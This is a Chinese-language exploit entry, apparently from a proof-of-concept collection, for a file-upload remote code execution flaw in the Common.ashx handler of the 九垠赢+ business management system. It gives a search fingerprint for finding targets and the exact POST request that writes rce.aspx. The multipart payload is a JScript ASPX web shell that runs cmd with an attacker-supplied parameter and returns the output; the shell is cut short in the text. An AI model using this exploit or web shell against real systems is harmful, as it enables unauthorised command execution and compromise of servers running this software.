# 九垠赢+商业管理系统Common.ashx存在文件上传致RCE漏洞

- **系统**：九垠赢+商业管理系统　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="九垠赢+"`
- **请求**：`POST /System/Common.ashx?type=savefile&path=rce.aspx HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlA…`

**请求体 / payload**
```
------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="content";
Content-Type: text/plain
<%@ Page Language="Jscript" validateRequest="false" %>
<%
var c=new System.Diagnostics.ProcessStartInfo("cmd");
var e=new System.Diagnostics.Process();
var out:System.IO.StreamReader,EI:System.IO.StreamReader;
c.UseShellExecute=false;
c.RedirectStandardOutput=true;
c.RedirectStandardError=true;
e.StartInfo=c;
c.Arguments="/c " + Request.Item["cmd"];
e.Start();
out=e.StandardOutput;
EI=e.StandardError;
e.Close();
Response.Write(out.ReadToEnd() + EI.ReadToEnd());
System.IO.File.Delet…（脚本共 710 字，完整版见原文）
```
- **预期**：200　|　—